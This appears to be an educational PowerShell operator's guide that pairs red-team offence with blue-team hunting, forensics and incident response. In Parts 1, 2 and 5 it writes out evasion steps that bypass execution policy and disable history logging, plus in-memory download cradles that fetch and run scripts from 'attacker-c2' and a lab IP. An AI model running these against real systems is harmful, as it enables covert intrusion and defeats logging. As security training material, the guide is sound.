# The PowerShell Operator’s Guide

#### From "Living-off-the-Land" to Advanced Forensics

Core Philosophy: PowerShell is not just a scripting language; it is the direct interface to the Windows API and .NET Framework.

* The Operator's Mindset: Everything is an Object. Text parsing (`grep`/`awk`) is secondary to object manipulation (`Select`, `Where`).
* The Golden Rule: "Living off the Land" (LotL) means using native tools to avoid triggering EDR/AV solutions.

***

### Part 1: The Environment & Fundamentals

_Before executing, establish control and understand the engine._

#### 1.1 Session Hygiene & OpSec

Professional operators do not rely on global settings; they configure the current session to be stealthy or verbose as needed.

Red Team (Stealth Configuration):

Avoid changing registry keys—bypass restrictions only for the running process.

```ps1
# 1. Bypass Execution Policy (Scope: Process Only)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# 2. Disable History Logging (Prevents artifacts in $env:APPDATA)
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# 3. Suppress Error Noise (cleaner output during recon)
$ErrorActionPreference = "SilentlyContinue"
```

Blue Team (Visibility Configuration):

Enable logging to capture attacker activity.

{% code overflow="wrap" %}
```ps1
# Enable Script Block Logging (Event ID 4104) - Captures de-obfuscated code
if (!(Test-Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging)) {
    New-Item -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force
}
Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name "EnableScriptBlockLogging" -Value 1
```
{% endcode %}

#### 1.2 The Object Pipeline (The Engine)

Mastering `Get-Member` (`gm`) is the difference between a novice and a pro.

<table data-header-hidden><thead><tr><th width="144"></th><th width="77"></th><th></th></tr></thead><tbody><tr><td><strong>Cmdlet</strong></td><td><strong>Alias</strong></td><td><strong>Function</strong></td></tr><tr><td><code>Get-Member</code></td><td><code>gm</code></td><td>Crucial. Reveals properties (data) and methods (actions) of an object.</td></tr><tr><td><code>Where-Object</code></td><td><code>?</code></td><td>Filters the pipeline based on object properties.</td></tr><tr><td><code>Select-Object</code></td><td><code>select</code></td><td>Extracts specific properties to display or export.</td></tr><tr><td><code>ForEach-Object</code></td><td><code>%</code></td><td>Iterates through items in the pipeline.</td></tr></tbody></table>

**The Workflow:**

1. Get the object.
2. Filter (`?`) the object.
3. Select (`select`) the data you need.

{% code overflow="wrap" %}
```ps1
# Example: Find processes consuming > 500MB RAM
Get-Process | Where-Object { $_.WorkingSet -gt 500MB } | Select-Object Name, Id, WorkingSet
```
{% endcode %}

***

### Part 2: Red Team Operations (Offence)

_Focus: Enumeration, Evasion, and Lateral Movement._

#### 2.1 Host Reconnaissance (LotL)

Gathering intelligence using native WMI/CIM classes (No external tools).

{% code overflow="wrap" %}
```ps1
# System Triage
Get-ComputerInfo | Select-Object OsName, WindowsVersion, CsProcessors, BiosSerialNumber

# Security Software Enumeration (Find EDR/AV)
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | 
    Select-Object displayName, productState, pathToSignedProductExe
```
{% endcode %}

#### 2.2 Network Discovery (The "Quiet" Scan)

Using .NET sockets to map the network without dropping Nmap.

{% code overflow="wrap" %}
```ps1
# Sweep a Subnet (192.168.1.x) for SMB (445) and RDP (3389)
1..254 | ForEach-Object { 
    $IP = "192.168.1.$_"
    $PortCheck = Test-NetConnection -ComputerName $IP -Port 445 -WarningAction SilentlyContinue
    if ($PortCheck.TcpTestSucceeded) {
        [PSCustomObject]@{ IP = $IP; Status = "Alive"; Service = "SMB" }
    }
}
```
{% endcode %}

#### 2.3 Active Directory (The "No-Module" Method)

Attackers often land on workstations without RSAT tools. Use the `[ADSISearcher]` accelerator.

{% code overflow="wrap" %}
```ps1
# Find Domain Admins (LDAP Query)
$Searcher = [adsisearcher]""
$Searcher.Filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))"
$Searcher.FindAll() | Select-Object Path

# Find Domain Controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | Select-Object Name, IPAddress
```
{% endcode %}

#### 2.4 "Fileless" Execution (Download Cradles)

Loading scripts directly into RAM to bypass file scanning.

{% code overflow="wrap" %}
```ps1
# The "Proxy-Aware" Download Cradle
# This downloads a script from a C2 server and runs it in memory (IEX)
$p = New-Object System.Net.WebProxy('http://proxy.corp.local:8080')
$p.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$wc = New-Object System.Net.WebClient; $wc.Proxy = $p
IEX ($wc.DownloadString('http://attacker-c2/payload.ps1'))
```
{% endcode %}

***

### Part 3: Blue Team Operations (Defence)

_Focus: Hunting, Hardening, and Auditing._

#### 3.1 Threat Hunting (Event Logs)

`Get-WinEvent` is superior to `Get-EventLog`. Use `FilterHashtable` for speed.

Hunting Brute Force (Credential Access):

{% code overflow="wrap" %}
```ps1
# Look for Event ID 4625 (Failed Logon) - High volume indicates spraying
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 500 | 
    Group-Object -Property {$_.Properties[19].Value} | # Group by Source IP
    Select-Object Count, Name | Sort-Object Count -Descending
```
{% endcode %}

Hunting Lateral Movement (Pass-the-Hash):

{% code overflow="wrap" %}
```ps1
# Look for Event ID 4624 (Logon) Type 3 (Network) using NTLM
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
    Where-Object { $_.Properties[8].Value -eq 3 -and $_.Properties[10].Value -eq 'NTLM' } | 
    Select-Object TimeCreated, @{N='Account';E={$_.Properties[5].Value}}, @{N='Source';E={$_.Properties[18].Value}}
```
{% endcode %}

#### 3.2 Integrity Checking

Verifying system state against known baselines.

{% code overflow="wrap" %}
```ps1
# Check for Unsigned Drivers/DLLs in System32 (Indicator of Rootkits)
Get-ChildItem C:\Windows\System32\*.dll | 
    Get-AuthenticodeSignature | 
    Where-Object { $_.Status -ne "Valid" } | Select-Object Path, Status
```
{% endcode %}

***

### Part 4: Incident Response (The Kill Chain)

_Scenario: Alert received. Ransomware or C2 active. Immediate Triage._

![Image of cyber attack kill chain](https://encrypted-tbn3.gstatic.com/licensed-image?q=tbn:ANd9GcTelHCasTLBS6-gj1H2lPddlKSDG0rl4BP7vTrd-6U4rDN0RYjP1mMIj1O-h1l5MgmD_JE8UrayFcQjolc2045OjW3Qn3XXye5e-yhfSeyrueSKGsI)Shutterstock

#### 4.1 Isolation (Surgical Firewalling)

Cut the host off from the internet/LAN, but keep your management port open.

{% code overflow="wrap" %}
```ps
# Block Everything
New-NetFirewallRule -DisplayName "ISOLATION_BLOCK_ALL" -Direction Inbound -Action Block -Profile Any
# Allow ONLY the IR Team Jump Box
New-NetFirewallRule -DisplayName "ISOLATION_ALLOW_IR" -Direction Inbound -Action Allow -RemoteAddress "10.0.0.50"
```
{% endcode %}

#### 4.2 Volatile Data Capture

Capture RAM artifacts before the system crashes or reboots.

{% code overflow="wrap" %}
```ps1
# 1. Capture Network Connections (Find the C2 IP)
Get-NetTCPConnection | Select-Object CreationTime, LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | 
    Export-Csv "C:\Evidence\net_connections.csv"

# 2. Capture Running Processes + Command Lines (Crucial for decoding malware)
Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine, ParentProcessId | 
    Export-Csv "C:\Evidence\processes.csv"
```
{% endcode %}

#### 4.3 Malware Analysis (Decoding Payloads)

Attackers use Base64 to hide. Decode it.

{% code overflow="wrap" %}
```ps1
# Detect and Decode "EncodedCommand"
$Malicious = Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match "-enc" }
foreach ($proc in $Malicious) {
    if ($proc.CommandLine -match "([A-Za-z0-9+/=]{20,})") {
        $b64 = $matches[1]
        $bytes = [System.Convert]::FromBase64String($b64)
        $decoded = [System.Text.Encoding]::Unicode.GetString($bytes)
        Write-Host "PID $($proc.ProcessId) Payload: $decoded" -ForegroundColor Red
    }
}
```
{% endcode %}

***

### Part 5: Modular Warfare (External Tools)

_Do not reinvent the wheel. Use community-standard modules._

#### 5.1 How to Load Modules (Safe vs. Unsafe)

* Safe (Blue Team): `Install-Module` from PSGallery.
* Stealth (Red Team): Load directly into memory via `IEX (WebClient)` to avoid disk artifacts.

#### 5.2 The "Red" Modules (Offence)

<table data-header-hidden><thead><tr><th width="136"></th><th width="197"></th><th></th></tr></thead><tbody><tr><td><strong>Module</strong></td><td><strong>Purpose</strong></td><td><strong>Critical Commands</strong></td></tr><tr><td>PowerView (PowerSploit)</td><td>AD Recon. The standard for mapping domains.</td><td><p><code>Get-NetDomain</code></p><p><br></p><p><code>Get-NetUser</code></p><p><br></p><p><code>Find-LocalAdminAccess</code> (Finds where you are admin)</p><p><br></p><p><code>Get-NetSession</code> (Finds where Domain Admins are logged in)</p></td></tr><tr><td>PowerUp</td><td>PrivEsc. Audits local vulnerabilities.</td><td><p><code>Invoke-AllChecks</code> (Runs full audit)</p><p><br></p><p><code>Get-ServiceUnquoted</code> (Finds unquoted paths)</p></td></tr><tr><td>Nishang</td><td>Exploitation. Shells and scanners.</td><td><p><code>Invoke-PowerShellTcp</code> (Reverse Shell)</p><p><br></p><p><code>Invoke-PortScan</code></p></td></tr></tbody></table>

Example: Memory Loading PowerView

```ps1
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerView.ps1')
Get-NetDomain
```

#### 5.3 The "Blue" Modules (Forensics)

| **Module**     | **Purpose**                         | **Critical Commands**                                                                                                                            |
| -------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| PowerForensics | Disk Forensics. Reads raw NTFS/MFT. | <p><code>Get-ForensicFileRecord</code> (Reads MFT)</p><p><br></p><p><code>Invoke-ForensicDD</code> (Bit-level copy of locked files like SAM)</p> |
| NTFSSecurity   | ACL Auditing. Readable permissions. | <p><code>Get-NTFSOwner</code></p><p><br></p><p><code>Get-NTFSAccess</code> (Audit who can read/write files)</p>                                  |
| MicroBurst     | Cloud. Azure AD auditing.           | <p><code>Get-AzDomainInfo</code></p><p><br></p><p><code>Get-AzStorageKeys</code></p>                                                             |

Example: Recovering Deleted Files with PowerForensics

{% code overflow="wrap" %}
```ps1
Import-Module PowerForensics
Get-ForensicFileRecord -VolumeName C: | Where-Object { $_.Deleted -eq $true -and $_.FileName -like "*password*" }
```
{% endcode %}

***

### Part 6: Advanced Scripting & Automation

_Professionalising your scripts._

#### 6.1 Error Handling (Try/Catch)

Essential for scripts that run across hundreds of machines.

```ps1
try {
    $Result = Get-WmiObject Win32_Bios -ComputerName "Server01" -ErrorAction Stop
}
catch {
    Write-Warning "Failed to connect to Server01: $_"
    "$(Get-Date) - Connection Failed" | Out-File "errors.log" -Append
}
```

#### 6.2 Data Export (JSON/CSV)

Never screenshot the console. Export to usable formats.

{% code overflow="wrap" %}
```ps1
# Export to CSV for Excel
Get-Service | Export-Csv -Path services.csv -NoTypeInformation

# Export to JSON for APIs/Python
Get-Process | Select-Object Name, Id, Path | ConvertTo-Json -Depth 2 | Out-File procs.json
```
{% endcode %}

***

### Part 7: The "Must-Have" Cheat Sheet

<table data-header-hidden><thead><tr><th width="159"></th><th></th></tr></thead><tbody><tr><td><strong>Task</strong></td><td><strong>Command / Syntax</strong></td></tr><tr><td>Download File</td><td><code>Invoke-WebRequest -Uri $url -OutFile $file</code></td></tr><tr><td>Search Content</td><td><code>Get-ChildItem -Recurse | Select-String "password"</code></td></tr><tr><td>Base64 Encode</td><td><code>[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($str))</code></td></tr><tr><td>Base64 Decode</td><td><code>[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))</code></td></tr><tr><td>Port Scan</td><td><code>Test-NetConnection -ComputerName $ip -Port $port</code></td></tr><tr><td>System Info</td><td><code>Get-ComputerInfo</code></td></tr><tr><td>User Info</td><td><code>whoami /all</code> or <code>Get-ADUser</code></td></tr><tr><td>Process Kill</td><td><code>Stop-Process -Id $pid -Force</code></td></tr><tr><td>History View</td><td><code>Get-Content (Get-PSReadlineOption).HistorySavePath</code></td></tr></tbody></table>

